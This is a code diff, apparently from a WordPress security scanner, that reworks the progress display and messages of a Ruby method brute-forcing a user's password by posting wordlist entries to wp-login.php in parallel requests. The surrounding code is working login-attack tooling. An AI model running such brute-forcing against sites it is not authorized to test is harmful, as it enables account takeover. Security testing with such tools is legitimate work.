@@ -10,38 +10,39 @@ class WpUser < WpItem
     #
     # @return [ void ]
     def brute_force(wordlist, options = {})
-      hydra               = Browser.instance.hydra
-      passwords           = BruteForcable.passwords_from_wordlist(wordlist)
-      number_of_passwords = passwords.size
-      login_url           = @uri.merge('wp-login.php').to_s
-      queue_count         = 0
-      request_count       = 0
+      hydra        = Browser.instance.hydra
+      passwords    = BruteForcable.passwords_from_wordlist(wordlist)
+      login        = self.login
+      login_url    = @uri.merge('wp-login.php').to_s
+      queue_count  = 0
+      found        = false
+      progress_bar = ProgressBar.create(format: '%t %a <%B> (%c / %C) %P%% %e',
+                                        title: "  Brute Forcing user '#{login}'",
+                                        length: 120,
+                                        total: passwords.size) if options[:show_progression]
 
       passwords.each do |password|
-        request_count += 1
-        queue_count   += 1
-        login          = self.login
+        queue_count += 1
 
         request = Browser.instance.forge_request(login_url,
-          {
-            method: :post,
-            body: { log: login, pwd: password },
-            cache_ttl: 0
-          }
+          method: :post,
+          body: { log: login, pwd: password },
+          cache_ttl: 0
         )
 
         request.on_complete do |response|
           puts "\n  Trying Username : #{login} Password : #{password}" if options[:verbose]
 
+          progress_bar.progress += 1 if options[:show_progression] && !found
+
           if valid_password?(response, password, options)
             self.password = password
+            found         = true
             return # Used as break
           end
         end
 
         hydra.queue(request)
-
-        print "\r  Brute forcing user '#{login}' with #{number_of_passwords} passwords... #{(request_count * 100) / number_of_passwords}% complete." if options[:show_progression]
 
         # it can take a long time to queue 2 million requests,
         # for that reason, we queue @threads, send @threads, queue @threads and so on.
@@ -57,7 +58,6 @@ class WpUser < WpItem
 
       # run all of the remaining requests
       hydra.run
-      puts if options[:show_progression]
     end
 
     # @param [ Typhoeus::Response ] response
@@ -69,22 +69,22 @@ class WpUser < WpItem
     # @return [ Boolean ]
     def valid_password?(response, password, options = {})
       if response.code == 302
-        puts "\n  " + green('[SUCCESS]') + " Login : #{login} Password : #{password}\n" if options[:show_progression]
+        puts "\n  " + green('[SUCCESS]') + " Login : #{login} Password : #{password}\n\n" if options[:show_progression]
         return true
       elsif response.body =~ /login_error/i
-        puts "\nIncorrect login and/or password." if options[:verbose]
+        puts "\n  Incorrect login and/or password." if options[:verbose]
       elsif response.timed_out?
-        puts red('ERROR:') + ' Request timed out.' if options[:show_progression]
+        puts "\n  " + red('ERROR:') + ' Request timed out.' if options[:show_progression]
       elsif response.code == 0
-        puts red('ERROR:') + ' No response from remote server. WAF/IPS?' if options[:show_progression]
+        puts "\n  " + red('ERROR:') + ' No response from remote server. WAF/IPS?' if options[:show_progression]
       elsif response.code.to_s =~ /^50/
-        puts red('ERROR:') + ' Server error, try reducing the number of threads.' if options[:show_progression]
+        puts "\n  " + red('ERROR:') + ' Server error, try reducing the number of threads.' if options[:show_progression]
       else
-        puts "\n" + red('ERROR:') + " We received an unknown response for #{password}..." if options[:show_progression]
+        puts "\n  " + red('ERROR:') + " We received an unknown response for #{password}..." if options[:show_progression]
 
         # HACK to get the coverage :/ (otherwise some output is present in the rspec)
-        puts red("Code: #{response.code}") if options[:verbose]
-        puts red("Body: #{response.body}") if options[:verbose]
+        puts red("    Code: #{response.code}") if options[:verbose]
+        puts red("    Body: #{response.body}") if options[:verbose]
         puts if options[:verbose]
       end
       false
